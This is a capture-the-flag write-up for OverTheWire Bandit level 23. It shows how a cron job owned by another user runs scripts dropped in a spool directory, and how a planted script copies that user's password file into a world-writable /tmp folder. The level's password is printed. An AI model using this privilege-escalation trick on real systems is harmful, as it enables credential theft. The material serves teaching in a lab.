# Level 23

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Solution

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
bandit23@bandit:~$ mkdir /tmp/scripted/
bandit23@bandit:~$ cd /tmp/script
bandit23@bandit:~$ nano myscript.sh
```

I then needed to create a script as per the hint. Because I know the password exists at `/etc/bandit_pass/bandit24` and that cron has the permission to run the script, I can just have it printed to a file in the `/tmp/scripted/` directory:

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 >> /tmp/scripted/password.txt
```

Then I just need to change the permissions on the file and place it within `/var/spool/bandit24/`:

```bash
bandit23@bandit:/tmp/scripted$ chmod 777 myscript.sh
bandit23@bandit:/tmp/scripted$ cp myscript.sh /var/spool/bandit24/
bandit23@bandit:/tmp/scripted$ ls -la
total 776
drwxr-sr-x    2 bandit23 root   4096 Aug  3 19:18 .
drwxrws-wt 4052 root     root 782336 Aug  3 19:19 ..
-rwxrwxrwx    1 bandit23 root     74 Aug  3 19:16 myscript.sh
bandit23@bandit:/tmp/scripted$ chmod 777 ../scripted
```

Then a case of watching the directory:

```bash
bandit23@bandit:/tmp/scripted$ watch ls -la
```

Eventually a password will be presented to our directory:

```bash
bandit23@bandit:/tmp/scripted$ cat password.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
